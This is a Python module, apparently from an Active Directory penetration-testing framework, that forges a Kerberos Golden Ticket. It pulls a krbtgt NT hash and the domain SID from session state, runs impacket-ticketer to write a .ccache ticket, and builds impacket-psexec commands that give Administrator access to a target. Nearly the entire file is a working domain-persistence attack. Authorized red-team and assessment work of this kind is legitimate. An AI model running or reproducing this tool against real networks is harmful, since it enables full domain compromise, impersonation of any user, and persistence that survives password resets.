"""
golden_ticket_module.py - Golden Ticket Persistence module for AD-Pathfinder.

Forges a Kerberos Golden Ticket using the krbtgt account NT hash obtained
via DCSync. The ticket grants unlimited access to any Kerberos service in
the domain.

Tools used:
    - impacket-ticketer  (pip install impacket)

Command (from playbook):
    impacket-ticketer -nthash <krbtgt_nt> -domain-sid <sid> -domain <domain> Administrator

Usage after forging:
    export KRB5CCNAME=<ticket.ccache>
    impacket-psexec -k -no-pass <domain>/Administrator@<target>
"""

from __future__ import annotations

import os
import re
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.panel import Panel
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore

# Impacket ticketer binaries to try
TICKETER_BINS = ["impacket-ticketer", "ticketer.py", "ticketer"]

# Domain SID format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
SID_RE = re.compile(r"S-1-5-21-\d+-\d+-\d+", re.IGNORECASE)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_ticketer(executor: CommandExecutor) -> Optional[str]:
    for binary in TICKETER_BINS:
        if executor.check_tool(binary):
            return binary
    return None


def _find_krbtgt_hash(state: AssessmentState) -> Optional[str]:
    """Scan state.ntlm_hashes for the krbtgt NT hash."""
    for entry in getattr(state, "ntlm_hashes", []):
        if entry.get("username", "").lower() == "krbtgt":
            return entry.get("nt")
    return None


def _find_domain_sid(state: AssessmentState) -> Optional[str]:
    """Try to extract domain SID from state findings or warnings."""
    for finding in state.findings_log:
        m = SID_RE.search(finding.get("description", ""))
        if m:
            return m.group(0)
    return None


def _ticket_path(assessment_id: str, target_user: str) -> str:
    os.makedirs("reports", exist_ok=True)
    return os.path.abspath(
        os.path.join("reports", f"{assessment_id}-golden-{target_user}.ccache")
    )


# ─────────────────────────────────────────────────────────────────────────────
# GoldenTicketModule
# ─────────────────────────────────────────────────────────────────────────────

class GoldenTicketModule:
    """
    Forge a Kerberos Golden Ticket using the krbtgt NT hash.

    Requires
    --------
    - krbtgt NT hash (from DCSync module)
    - Domain SID (S-1-5-21-...)
    - impacket-ticketer

    Command produced:
        impacket-ticketer -nthash <krbtgt_nt> -domain-sid <sid> -domain <domain> <user>
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Forge a Golden Ticket and save as .ccache.

        Returns
        -------
        dict
            {
                "status":       "success" | "error",
                "ticket_path":  str | None,
                "target_user":  str,
                "export_cmd":   str,
                "use_cmd":      str,
                "error":        str | None,
                "warnings":     list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        binary = _detect_ticketer(self.executor)
        if not binary:
            return self._error(
                "impacket-ticketer not found. Install: pip install impacket"
            )

        # ── Gather parameters ─────────────────────────────────────────────
        console.print()
        console.print("  [bold bright_cyan]Golden Ticket Forge[/bold bright_cyan]\n")

        # krbtgt hash — auto-fill from state if available
        krbtgt_nt = _find_krbtgt_hash(state)
        if krbtgt_nt:
            console.print(f"  [dim]krbtgt NT hash found in session: {krbtgt_nt[:8]}…[/dim]")
            use_stored = Prompt.ask(
                "  [bold yellow]Use stored krbtgt hash?[/bold yellow]",
                choices=["yes", "no"], default="yes",
            )
            if use_stored != "yes":
                krbtgt_nt = None

        if not krbtgt_nt:
            krbtgt_nt = Prompt.ask(
                "  [bold yellow]krbtgt NT hash[/bold yellow] [dim](from DCSync output)[/dim]"
            ).strip()

        # Domain SID — auto-fill if found in findings
        domain_sid = _find_domain_sid(state)
        if domain_sid:
            console.print(f"  [dim]Domain SID found: {domain_sid}[/dim]")
            use_stored_sid = Prompt.ask(
                "  [bold yellow]Use this SID?[/bold yellow]",
                choices=["yes", "no"], default="yes",
            )
            if use_stored_sid != "yes":
                domain_sid = None

        if not domain_sid:
            domain_sid = Prompt.ask(
                "  [bold yellow]Domain SID[/bold yellow] [dim](e.g. S-1-5-21-111-222-333)[/dim]"
            ).strip()

        target_user = Prompt.ask(
            "  [bold yellow]Target username for ticket[/bold yellow]",
            default="Administrator",
        ).strip()

        # ── Validate inputs ───────────────────────────────────────────────
        if not re.match(r"^[a-f0-9]{32}$", krbtgt_nt, re.IGNORECASE):
            return self._error(
                f"Invalid krbtgt NT hash format: '{krbtgt_nt}'. Expected 32 hex characters."
            )
        if not SID_RE.match(domain_sid):
            warnings.append(
                f"SID '{domain_sid}' does not match expected format S-1-5-21-X-X-X. Proceeding anyway."
            )

        # ── Build command ─────────────────────────────────────────────────
        # Exact playbook: impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> <user>
        ticket_path = _ticket_path(state.assessment_id, target_user)
        ticket_dir  = os.path.dirname(ticket_path)
        ticket_name = os.path.splitext(os.path.basename(ticket_path))[0]

        cmd = [
            binary,
            "-nthash",     krbtgt_nt,
            "-domain-sid", domain_sid,
            "-domain",     state.domain,
            target_user,
        ]
        redacted = (
            f"{binary} -nthash **** -domain-sid {domain_sid} "
            f"-domain {state.domain} {target_user}"
        )

        console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]\n")

        # Execute from reports dir so the ticket file lands there
        result = self.executor.run(cmd, timeout=30, cwd=ticket_dir)
        output = result["output"] + "\n" + result["error"]

        # Ticketer writes <user>.ccache in cwd — rename if needed
        generated = os.path.join(ticket_dir, f"{target_user}.ccache")
        if os.path.exists(generated) and generated != ticket_path:
            os.rename(generated, ticket_path)

        if not os.path.exists(ticket_path):
            # Some versions output directly without creating a file
            if "Saving ticket" not in output and result["exit_code"] != 0:
                return self._error(
                    result["error"] or "impacket-ticketer failed — no .ccache file created."
                )

        # ── Update state ──────────────────────────────────────────────────
        if hasattr(state, "golden_ticket_path"):
            state.golden_ticket_path = ticket_path  # type: ignore[attr-defined]

        export_cmd = f"export KRB5CCNAME={ticket_path}"
        use_cmd = (
            f"impacket-psexec -k -no-pass {state.domain}/{target_user}@{state.target_ip}"
        )

        state.log_finding(
            "Golden Ticket",
            f"Forged Golden Ticket for '{target_user}' in {state.domain}. "
            f"Ticket: {ticket_path}",
            severity="CRITICAL",
        )
        state.log_action(f"Golden Ticket forged: {target_user} @ {state.domain}")

        return {
            "status":      "success",
            "ticket_path": ticket_path,
            "target_user": target_user,
            "export_cmd":  export_cmd,
            "use_cmd":     use_cmd,
            "error":       None,
            "warnings":    warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":      "error",
            "ticket_path": None,
            "target_user": "",
            "export_cmd":  "",
            "use_cmd":     "",
            "error":       message,
            "warnings":    [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.golden_ticket_module import run as gt_run
    result = gt_run(state)
    """
    return GoldenTicketModule(executor).run(state)
